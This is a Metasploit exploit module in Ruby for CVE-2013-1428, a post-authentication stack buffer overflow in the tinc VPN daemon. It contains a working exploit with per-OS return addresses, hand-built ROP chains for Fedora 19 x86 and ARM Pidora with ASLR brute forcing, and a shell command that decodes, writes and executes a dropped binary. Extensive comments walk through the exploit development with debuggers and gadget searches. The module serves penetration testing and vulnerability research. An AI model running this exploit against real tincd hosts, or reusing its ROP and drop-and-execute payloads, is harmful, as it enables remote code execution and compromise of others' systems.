##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
 
require 'msf/core'
require 'securerandom'
 
class Metasploit3 < Msf::Exploit::Remote
  Rank = AverageRanking
 
  include Msf::Exploit::EXE
  include Msf::Exploit::Remote::TincdExploitClient
 
  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Tincd Post-Authentication Remote TCP Stack Buffer Overflow',
      'Description'    => %q{
        This module exploits a stack buffer overflow in Tinc's tincd
        service. After authentication, a specially crafted tcp packet (default port 655)
        leads to a buffer overflow and allows to execute arbitrary code. This module has
        been tested with tinc-1.1pre6 on Windows XP (custom calc payload) and Windows 7
        (windows/meterpreter/reverse_tcp), and tinc version 1.0.19 from the ports of
        FreeBSD 9.1-RELEASE # 0 and various other OS, see targets. The exploit probably works
        for all versions <= 1.1pre6.
        A manually compiled version (1.1.pre6) on Ubuntu 12.10 with gcc 4.7.2 seems to
        be a non-exploitable crash due to calls to __memcpy_chk depending on how tincd
        was compiled. Bug got fixed in version 1.0.21/1.1pre7. While writing this module
        it was recommended to the maintainer to start using DEP/ASLR and other protection
        mechanisms.
      },
      'Author'         =>
        [
            # PoC changes (mostly reliability), port python to ruby, exploitation including ROP, support for all OS, metasploit module
            'Tobias Ospelt <tobias[at]modzero.ch>', # @floyd_ch
            # original finding, python PoC crash
            'Martin Schobert <schobert[at]modzero.ch>' # @nitram2342
        ],
      'References'     =>
        [
          ['CVE', '2013-1428'],
          ['OSVDB', '92653'],
          ['BID', '59369'],
          ['URL', 'http://www.floyd.ch/?p=741'],
          ['URL', 'http://sitsec.net/blog/2013/04/22/stack-based-buffer-overflow-in-the-vpn-software-tinc-for-authenticated-peers/'],
          ['URL', 'http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=2013-1428']
        ],
      'DefaultOptions' =>
        {
          'EXITFUNC' => 'process'
        },
      'Payload'        =>
        {
          'Space'    => 1675,
          'DisableNops' => true
        },
      'Privileged'     => true,
      'Targets'        =>
          [
            # full exploitation x86:
            ['Windows XP x86, tinc 1.1.pre6 (exe installer)',  { 'Platform' => 'win', 'Ret' => 0x0041CAA6, 'offset' => 1676 }],
            ['Windows 7 x86, tinc 1.1.pre6 (exe installer)',  { 'Platform' => 'win', 'Ret' => 0x0041CAA6, 'offset' => 1676 }],
            ['FreeBSD 9.1-RELEASE # 0 x86, tinc 1.0.19 (ports)', { 'Platform' => 'bsd', 'Ret' => 0x0804BABB, 'offset' => 1676 }],
            ['Fedora 19 x86 ROP (NX), write binary to disk payloads, tinc 1.0.20 (manual compile)', {
              'Platform' => 'linux', 'Arch' => ARCH_X86, 'Ret' => 0x4d10ee87, 'offset' => 1676 }
              ],
            ['Fedora 19 x86 ROP (NX), CMD exec payload, tinc 1.0.20 (manual compile)', {
              'Platform' => 'unix', 'Arch' => ARCH_CMD, 'Ret' => 0x4d10ee87, 'offset' => 1676 }
              ],
            ['Archlinux 2013.04.01 x86, tinc 1.0.20 (manual compile)',  { 'Platform' => 'linux', 'Ret' => 0x08065929, 'offset' => 1676 }],
            ['OpenSuse 11.2 x86, tinc 1.0.20 (manual compile)',  { 'Platform' => 'linux', 'Ret' => 0x0804b07f, 'offset' => 1676 }],
            # full exploitation ARM:
            ['Pidora 18 ARM ROP(NX)/ASLR brute force, write binary to disk payloads, tinc 1.0.20 (manual compile with restarting daemon)',  {
              'Platform' => 'linux', 'Arch' => ARCH_ARMLE, 'Ret' => 0x00015cb4, 'offset' => 1668 }
            ],
            ['Pidora 18 ARM ROP(NX)/ASLR brute force, CMD exec payload, tinc 1.0.20 (manual compile with restarting daemon)',  {
              'Platform' => 'linux', 'Arch' => ARCH_CMD, 'Ret' => 0x00015cb4, 'offset' => 1668 }
            ],
            # crash only:
            ['Crash only: Ubuntu 12.10 x86, tinc 1.1.pre6 (apt-get or manual compile)',  { 'Platform' => 'linux', 'Ret' => 0x0041CAA6, 'offset' => 1676 }],
            ['Crash only: Fedora 16 x86, tinc 1.0.19 (yum)',  { 'Platform' => 'linux', 'Ret' => 0x0041CAA6, 'offset' => 1676 }],
            ['Crash only: OpenSuse 11.2 x86, tinc 1.0.16 (rpm package)',  { 'Platform' => 'linux', 'Ret' => 0x0041CAA6, 'offset' => 1676 }],
            ['Crash only: Debian 7.3 ARM, tinc 1.0.19 (apt-get)',  { 'Platform' => 'linux', 'Ret' => 0x9000, 'offset' => 1668 }]
          ],
      'DisclosureDate' => 'Apr 22 2013', # finding, msf module: Dec 2013
      'DefaultTarget'  => 0))
 
    register_options(
        [ # Only for shellcodes that write binary to disk
          # Has to be short, usually either . or /tmp works
          # /tmp could be mounted as noexec
          # . is usually only working if tincd is running as root
          OptString.new('BINARY_DROP_LOCATION', [false, 'Short location to drop executable on server, usually /tmp or .', '/tmp']),
          OptInt.new('BRUTEFORCE_TRIES', [false, 'How many brute force tries (ASLR brute force)', 200]),
          OptInt.new('WAIT', [false, 'Waiting time for server daemon restart (ASLR brute force)', 3])
        ], self
      )
  end
 
  def exploit
    # #
    # x86
    # #
    # WINDOWS XP and 7 full exploitation
    # Simple, we only need some mona.py magic
    # C:\Program Files\tinc>"C:\Program Files\Immunity Inc\Immunity Debugger\ImmunityDebugger.exe" "C:\Program Files\tinc\tincd.exe -D -d 5"
    # !mona config -set workingfolder c:\logs\%p
    # !mona pc 1682
    #  --> C:\logs\tincd\pattern
    # !mona findmsp
    # Straight forward, when we overwrite EIP the second value
    # on the stack is pointing to our payload.
    # !mona findwild -o -type instr -s "pop r32# ret"
 
    # FREEBSD full exploitation
    # Same offset as windows, same exploitation method
    # But we needed a new pop r32# ret for the freebsd version
    # No mona.py help on bsd or linux so:
    # - Dumped .text part of tincd binary in gdb
    # - Search in hex editor for opcodes for "pop r32# ret":
    #  58c3, 59c3, ..., 5fc3
    # - Found a couple of 5dc3. ret = start of .text + offset in hex editor
    # - 0x0804BABB works very well
 
    # UBUNTU crash only
    # Manually compiled version (1.1.pre6) on Ubuntu 12.10 with gcc 4.7.2 seems to be a non-exploitable crash, because
    # the bug is in a fixed size (MAXSIZE) struct member variable. The size of the destination is known
    # at compile time. gcc is introducing a call to __memcpy_chk:
    # http://gcc.gnu.org/svn/gcc/branches/cilkplus/libssp/memcpy-chk.c
    # memcpy_chk does a __chk_fail call if the destination buffer is smaller than the source buffer. Therefore it will print
    # *** buffer overflow detected *** and terminate (SIGABRT). The same result for tincd 10.0.19 which can be installed
    # from the repository. It might be exploitable for versions compiled with an older version of gcc.
    # memcpy_chk seems to be in gcc since 2005:
    # http://gcc.gnu.org/svn/gcc/branches/cilkplus/libssp/memcpy-chk.c
    # http://gcc.gnu.org/git/?p=gcc.git;a=history;f=libssp/memcpy-chk.c;hb=92920cc62318e5e8b6d02d506eaf66c160796088
 
    # OPENSUSE
    # OpenSuse 11.2
    # Installation as described on the tincd website. For 11.2 there are two versions.
    # Decided for 1.0.16 as this is a vulnerable version
    # wget "http://download.opensuse.org/repositories/home:/seilerphilipp/SLE_11_SP2/i586/tinc-1.0.16-3.1.i586.rpm"
    # rpm -i tinc-1.0.16-3.1.i586.rpm
    # Again, strace shows us that the buffer overflow was detected (see Ubuntu)
    # writev(2, [{"*** ", 4}, {"buffer overflow detected", 24}, {" ***: ", 6}, {"tincd", 5}, {" terminated\n", 12}], 5) = 51
    # So a crash-only non-exploitable bof here. So let's go for manual install:
    # wget 'http://www.tinc-vpn.org/packages/tinc-1.0.20.tar.gz'
    # yast -i gcc zlib zlib-devel && echo "yast is still ugly" && zypper install lzo-devel libopenssl-devel make && make && make install
    # Exploitable. Let's see:
    # tincd is mapped at 0x8048000. There is a 5d3c at offset 307f in the tincd binary. this means:
    # the offset to pop ebp; ret is 0x0804b07f
 
    # FEDORA
    # Fedora 16
    # yum has version 1.0.19
    # yum install tinc
    # Non-exploitable crash, see Ubuntu. Strace tells us:
    # writev(2, [{"*** ", 4}, {"buffer overflow detected", 24}, {" ***: ", 6}, {"tincd", 5}, {" terminated\n", 12}], 5) = 51
    # About yum: Fedora 17 has fixed version 1.0.21, Fedora 19 fixed version 1.0.23
    # Manual compile went on with Fedora 19
    # wget 'http://www.tinc-vpn.org/packages/tinc-1.0.20.tar.gz'
    # yum install gcc zlib-devel.i686 lzo-devel.i686 openssl-devel.i686 && ./configure && make && make install
    # Don't forget to stop firewalld for testing, as the port is still closed otherwise
    # # hardening-check tincd
    # tincd:
    #  Position Independent Executable: no, normal executable!
    #  Stack protected: no, not found!
    #  Fortify Source functions: no, only unprotected functions found!
    #  Read-only relocations: yes
    #  Immediate binding: no, not found!
    # Running this module with target set to Windows:
    # Program received signal SIGSEGV, Segmentation fault.
    # 0x0041caa6 in ?? ()
    # well and that's our windows offset...
    # (gdb) info proc mappings
    # 0x8048000  0x8068000    0x20000        0x0 /usr/local/sbin/tincd
    # After finding a normal 5DC3 (pop ebp# ret) at offset 69c3 of the binary we
    # can try to execute the payload on the stack, but:
    # (gdb) stepi
    # Program received signal SIGSEGV, Segmentation fault.
    # 0x08e8ee08 in ?? ()
    # Digging deeper we find:
    # dmesg | grep protection
    # [    0.000000] NX (Execute Disable) protection: active
    # or:
    # # objdump -x /usr/local/sbin/tincd
    # [...] STACK off    0x00000000 vaddr 0x00000000 paddr 0x00000000 align 2**4
    #       filesz 0x00000000 memsz 0x00000000 flags rw-
    # or: https://bugzilla.redhat.com/show_bug.cgi?id=996365
    # Time for ROP
    # To start the ROP we need a POP r32# POP ESP# RET (using the first four bytes of the shellcode
    # as a pointer to instructions). Was lucky after some searching:
    # (gdb) x/10i 0x4d10ee87
    #    0x4d10ee87:  pop    %ebx
    #    0x4d10ee88:  mov    $0xf5d299dd,%eax
    #    0x4d10ee8d:  rcr    %cl,%al
    #    0x4d10ee8f:  pop    %esp
    #    0x4d10ee90:  ret
 
    # ARCHLINUX
    # archlinux-2013.04.01 pacman has fixed version 1.0.23, so went for manual compile:
    # wget 'http://www.tinc-vpn.org/packages/tinc-1.0.20.tar.gz'
    # pacman -S gcc zlib lzo openssl make && ./configure && make && make install
    # Offset in binary to 58c3: 0x1D929 + tincd is mapped at starting address 0x8048000
    # -->Ret: 0x8065929
    # No NX protection, it simply runs the shellcode :)
 
    # #
    # ARM
    # #
    # ARM Pidora 18 (Raspberry Pi Fedora Remix) on a physical Raspberry Pi
    # Although this is more for the interested reader, as Pidora development
    # already stopped... Raspberry Pi's are ARM1176JZF-S (700 MHz) CPUs
    # meaning it's an ARMv6 architecture
    # yum has fixed version 1.0.21, so went for manual compile:
    # wget 'http://www.tinc-vpn.org/packages/tinc-1.0.20.tar.gz'
    # yum install gdb gcc zlib-devel lzo-devel openssl-devel && ./configure && make && make install
    # Is the binary protected?
    # wget "http://www.trapkit.de/tools/checksec.sh" && chmod +x checksec.sh
    # # ./checksec.sh --file /usr/local/sbin/tincd
    # RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
    # No RELRO        No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   /usr/local/sbin/tincd
    # so again NX... but what about the system things?
    #  cat /proc/sys/kernel/randomize_va_space
    # 2
    # --> "Randomize the positions of the stack, VDSO page, shared memory regions, and the data segment.
    #      This is the default setting."
    # Here some examples of the address of the system function:
    # 0xb6c40848
    # 0xb6cdd848
    # 0xb6c7c848
    # Looks like we would have to brute force one byte
    # (gdb) info proc mappings
    #  0x8000    0x23000    0x1b000          0         /usr/local/sbin/tincd
    # 0x2b000    0x2c000     0x1000    0x1b000         /usr/local/sbin/tincd
    # When we exploit we get the following:
    # Program received signal SIGSEGV, Segmentation fault.
    # 0x90909090 in ?? ()
    # ok, finally a different offset to eip. Let's figure it out:
    # $ tools/pattern_create.rb 1676
    # Ok, pretty close, it's 1668. If we randomly choose ret as 0x9000 we get:
    # (gdb) break *0x9000
    # Breakpoint 1 at 0x9000
    # See that our shellcode is *on* the stack:
    # (gdb) x/10x $sp
    # 0xbee14308: 0x00000698 0x00000000 0x00000000 0x00000698
    # 0xbee14318: 0x31203731 0x0a323736 0xe3a00002 0xe3a01001 <-- 0xe3a00002 is the start of our shellcode
    # 0xbee14328: 0xe3a02006 0xe3a07001
    # let's explore the code we can reuse:
    # (gdb) info functions
    # objdump -d /usr/local/sbin/tincd >assembly.txt
    # while simply searching for the bx instruction we were not very lucky,
    # but searching for some "pop pc" it's easy to find nice gadgets.
    # we can write arguments to the .data section again:
    # 0x2b3f0->0x2b4ac at 0x0001b3f0: .data ALLOC LOAD DATA HAS_CONTENTS
    # The problem is we can not reliably forecast the system function's address, but it's
    # only one byte random, therefore we have to brute force it and/or find a memory leak.
    # Let's assume it's a restarting daemon:
    # create /etc/systemd/system/tincd.service and fill in Restart=restart-always
 
    # ARM Debian Wheezy on qemu
    # root@debian:~# apt-cache showpkg tinc
    # Package: tinc
    # Versions:
    # 1.0.19-3 (/var/lib/apt/lists/ftp.halifax.rwth-aachen.de_debian_dists_wheezy_main_binary-armhf_Packages)
    # nice, that's vulnerable
    # apt-get install tinc
    # apt-get install elfutils && ln -s /usr/bin/eu-readelf /usr/bin/readelf
    # wget "http://www.trapkit.de/tools/checksec.sh" && chmod +x checksec.sh
    # # ./checksec.sh --file /usr/sbin/tincd
    # RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
    # Partial RELRO   Canary found      NX enabled    No PIE          No RPATH   No RUNPATH   /usr/sbin/tincd
    # Puh, doesn't look too good for us, NX enabled, Stack canary present and a partial RELRO, I'm not going to cover this one here
 
    packet_payload = payload.encoded
    # Pidora and Fedora/ROP specific things
    if target.name =~ /Pidora 18/ || target.name =~ /Fedora 19/
      rop_generator = nil
      filename = rand_text_alpha(1)
      cd = "cd #{datastore['BINARY_DROP_LOCATION']};"
      cd = '' if datastore['BINARY_DROP_LOCATION'] == '.'
 
      if target.name =~ /Pidora 18/
        print_status('Using ROP and brute force ASLR guesses to defeat NX/ASLR on ARMv6 based Pidora 18')
        print_status('This requires a restarting tincd daemon!')
        print_status('Warning: This is likely to get tincd into a state where it doesn\'t accept connections anymore')
        rop_generator = method(:create_pidora_rop)
      elsif target.name =~ /Fedora 19/
        print_status('Using ROP to defeat NX on Fedora 19')
        rop_generator = method(:create_fedora_rop)
      end
 
      if target.arch.include? ARCH_CMD
        # The CMD payloads are a bit tricky on Fedora. As of december 2013
        # some of the generic unix payloads (e.g. reverse shell with awk) don't work
        # (even when executed directly in a terminal on Fedora)
        # use generic/custom and specify PAYLOADSTR without single quotes
        # it's usually sh -c *bla*
        packet_payload = create_fedora_rop(payload.encoded.split(' ', 3))
      else
        # the binary drop payloads
        packet_payload = get_cmd_binary_drop_payload(filename, cd, rop_generator)
        if packet_payload.length > target['offset']
          print_status("Plain version too big (#{packet_payload.length}, max. #{target['offset']}), trying zipped version")
          packet_payload = get_gzip_cmd_binary_drop_payload(filename, cd, rop_generator)
          vprint_status("Achieved version with #{packet_payload.length} bytes")
        end
      end
    end
 
    if packet_payload.length > target['offset']
      fail_with(Exploit::Failure::BadConfig, "The resulting payload has #{packet_payload.length} bytes, we only have #{target['offset']} space.")
    end
    injection = packet_payload + rand_text_alpha(target['offset'] - packet_payload.length) + [target.ret].pack('V')
 
    vprint_status("Injection starts with #{injection.unpack('H*')[0][0..30]}...")
 
    if target.name =~ /Pidora 18/
      # we have to brute force to defeat ASLR
      datastore['BRUTEFORCE_TRIES'].times do
        print_status("Try #{n}: Initializing tinc exploit client (setting up ciphers)")
        setup_ciphers
        print_status('Telling tinc exploit client to connect, handshake and send the payload')
        begin
          send_recv(injection)
        rescue RuntimeError, Rex::AddressInUse, ::Errno::ETIMEDOUT, Rex::HostUnreachable, Rex::ConnectionTimeout, ::Timeout::Error, ::EOFError => runtime_error
          print_error(runtime_error.message)
          print_error(runtime_error.backtrace.join("\n\t"))
        rescue Rex::ConnectionRefused
          print_error('Server refused connection. Is this really a restarting daemon? Try higher WAIT option.')
          sleep(3)
          next
        end
        secs = datastore['WAIT']
        print_status("Waiting #{secs} seconds for server to restart daemon (which will change the ASLR byte)")
        sleep(secs)
      end
      print_status("Brute force with #{datastore['BRUTEFORCE_TRIES']} tries done. If not successful you could try again.")
    else
      # Setup local ciphers
      print_status('Initializing tinc exploit client (setting up ciphers)')
      setup_ciphers
      # The tincdExploitClient will do the crypto handshake with the server and
      # send the injection (a packet), where the actual buffer overflow is triggered
      print_status('Telling tinc exploit client to connect, handshake and send the payload')
      send_recv(injection)
    end
    print_status('Exploit finished')
  end
 
  def get_cmd_binary_drop_payload(filename, cd, rop_generator)
    elf_base64 = Rex::Text.encode_base64(generate_payload_exe)
    cmd = ['/bin/sh', '-c', "#{cd}echo #{elf_base64}|base64 -d>#{filename};chmod +x #{filename};./#{filename}"]
    vprint_status("You will try to execute #{cmd.join(' ')}")
    rop_generator.call(cmd)
  end
 
  def get_gzip_cmd_binary_drop_payload(filename, cd, rop_generator)
    elf_zipped_base64 = Rex::Text.encode_base64(Rex::Text.gzip(generate_payload_exe))
    cmd = ['/bin/sh', '-c', "#{cd}echo #{elf_zipped_base64}|base64 -d|gunzip>#{filename};chmod +x #{filename};./#{filename}"]
    vprint_status("You will try to execute #{cmd.join(' ')}")
    rop_generator.call(cmd)
  end
 
  def create_pidora_rop(sys_execv_args)
    sys_execv_args = sys_execv_args.join(' ')
    sys_execv_args += "\x00"
 
    aslr_byte_guess = SecureRandom.random_bytes(1).ord
    print_status("Using 0x#{aslr_byte_guess.to_s(16)} as random byte for ASLR brute force (hope the server will use the same at one point)")
 
    # Gadgets tincd
    # c714: e1a00004    mov r0, r4
    # c718: e8bd8010    pop {r4, pc}
    mov_r0_r4_pop_r4_ret = [0x0000c714].pack('V')
    pop_r4_ret = [0x0000c718].pack('V')
    # 1cef4:    e580400c    str r4, [r0, #12]
    # 1cef8:    e8bd8010    pop {r4, pc}
    # mov_r0_plus_12_to_r4_pop_r4_ret = [0x0001cef4].pack('V')
 
    # bba0: e5843000    str r3, [r4]
    # bba4: e8bd8010    pop {r4, pc}
    mov_to_r4_addr_pop_r4_ret = [0x0000bba0].pack('V')
 
    # 13ccc:    e1a00003    mov r0, r3
    # 13cd0:    e8bd8008    pop {r3, pc}
    pop_r3_ret = [0x00013cd0].pack('V')
 
    # address to start rop (removing 6 addresses of garbage from stack)
    # 15cb4:    e8bd85f0    pop {r4, r5, r6, r7, r8, sl, pc}
    # start_rop = [0x00015cb4].pack('V')
    # see target Ret
 
    # system function address base to brute force
    # roughly 500 tests showed addresses between
    # 0xb6c18848 and 0xb6d17848 (0xff distance)
    system_addr = [0xb6c18848 + (aslr_byte_guess * 0x1000)].pack('V')
 
    # pointer into .data section
    loc_dot_data = 0x0002b3f0 # a location inside .data
 
    # Rop into system(), prepare address of payload in r0
    rop = ''
 
    # first, let's put the payload into the .data section
 
    # Put the first location to write to in r4
    rop += pop_r4_ret
 
    sys_execv_args.scan(/.{1,4}/).each_with_index do |argument_part, i|
      # Give location inside .data via stack
      rop += [loc_dot_data + i * 4].pack('V')
      # Pop 4 bytes of the command into r3
      rop += pop_r3_ret
      # Give 4 bytes of command on stack
      if argument_part.length == 4
        rop += argument_part
      else
        rop += argument_part + rand_text_alpha(4 - argument_part.length)
      end
      # Write the 4 bytes to the writable location
      rop += mov_to_r4_addr_pop_r4_ret
    end
 
    # put the address of the payload into r4
    rop += [loc_dot_data].pack('V')
 
    # now move r4 to r0
    rop += mov_r0_r4_pop_r4_ret
    rop += rand_text_alpha(4)
    # we don't care what ends up in r4 now
 
    # call system
    rop += system_addr
  end
 
  def create_fedora_rop(sys_execv_args)
    # Gadgets tincd
    loc_dot_data = 0x80692e0 # a location inside .data
    pop_eax = [0x8065969].pack('V') # pop eax; ret
    pop_ebx = [0x8049d8d].pack('V') # pop ebx; ret
    pop_ecx = [0x804e113].pack('V') # pop ecx; ret
    xor_eax_eax = [0x804cd60].pack('V') # xor eax eax; ret
    # <ATTENTION> This one destroys ebx:
    mov_to_eax_addr = [0x805f2c2].pack('V') + rand_text_alpha(4) # mov [eax] ecx ; pop ebx ; ret
    # </ATTENTION>
 
    # Gadgets libcrypto.so.10 libcrypto.so.1.0.1e
    xchg_ecx_eax = [0x4d170d1f].pack('V') # xchg ecx,eax; ret
    # xchg_edx_eax = [0x4d25afa3].pack('V') # xchg edx,eax ; ret
    # inc_eax = [0x4d119ebc].pack('V') # inc eax ; ret
 
    # Gadgets libc.so.6 libc-2.17.so
    pop_edx = [0x4b5d7aaa].pack('V') # pop edx; ret
    int_80 = [0x4b6049c5].pack('V') # int 0x80
 
    # Linux kernel system call 11: sys_execve
    # ROP
    rop = ''
 
    index = 0
    stored_argument_pointer_offsets = []
 
    sys_execv_args.each_with_index do |argument, argument_no|
      stored_argument_pointer_offsets << index
      argument.scan(/.{1,4}/).each_with_index do |argument_part, i|
        # Put location to write to in eax
        rop += pop_eax
        # Give location inside .data via stack
        rop += [loc_dot_data + index + i * 4].pack('V')
        # Pop 4 bytes of the command into ecx
        rop += pop_ecx
        # Give 4 bytes of command on stack
        if argument_part.length == 4
          rop += argument_part
        else
          rop += argument_part + rand_text_alpha(4 - argument_part.length)
        end
        # Write the 4 bytes to the writable location
        rop += mov_to_eax_addr
      end
      # We have to end the argument with a zero byte
      index += argument.length
      # We don't have "xor ecx, ecx", but we have it for eax...
      rop += xor_eax_eax
      rop += xchg_ecx_eax
      # Put location to write to in eax
      rop += pop_eax
      # Give location inside .data via stack
      rop += [loc_dot_data + index].pack('V')
      # Write the zeros
      rop += mov_to_eax_addr
      index += 1 # where we can write the next argument
    end
 
    # Append address of the start of each argument
    stored_argument_pointer_offsets.each do |offset|
      rop += pop_eax
      rop += [loc_dot_data + index].pack('V')
      rop += pop_ecx
      rop += [loc_dot_data + offset].pack('V')
      rop += mov_to_eax_addr
      index += 4
    end
    # end with zero
    rop += xor_eax_eax
    rop += xchg_ecx_eax
 
    rop += pop_eax
    rop += [loc_dot_data + index].pack('V')
    rop += mov_to_eax_addr
 
    rop += pop_ebx
    rop += [loc_dot_data].pack('V')
 
    rop += pop_ecx
    rop += [loc_dot_data + sys_execv_args.join(' ').length + 1].pack('V')
 
    rop += pop_edx
    rop += [loc_dot_data + index].pack('V')
 
    # sys call 11 = sys_execve
    rop += pop_eax
    rop += [0x0000000b].pack('V')
 
    rop += int_80
  end
end
